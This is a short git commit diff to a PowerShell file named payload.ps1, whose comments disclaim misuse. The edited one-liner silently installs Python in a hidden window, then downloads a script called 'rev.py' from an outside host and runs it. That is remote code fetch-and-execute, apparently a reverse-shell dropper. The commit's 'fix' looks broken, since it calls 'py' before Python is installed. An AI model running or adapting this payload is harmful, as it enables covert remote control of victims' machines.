644ec5cef1e826eb1025acba3a68de422772aea4
Fybir_ <76460450+LFDBA@users.noreply.github.com>
2025-12-23 20:11:59 +1300

    Fix command to start Python installer

--- payload.ps1
+++ payload.ps1
@@ -3,4 +3,4 @@
 #Do NOT deploy for phishing, fraud, impersonation, or unauthorized access.
 #The author disclaims all liability for misuse.
 
-curl -o python.exe https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe ; Start-Process .\python.exe -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -WindowStyle Hidden -Wait; py -m pip install requests; curl -o r.py https://jblowfi.org/rev.py; py r.py;
+curl -o python.exe https://www.python.org/ftp/python/3.12.2/python-3.12.2-amd64.exe ; Start-Process py -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -WindowStyle Hidden -Wait; py -m pip install requests; curl -o r.py https://jblowfi.org/rev.py; py r.py;
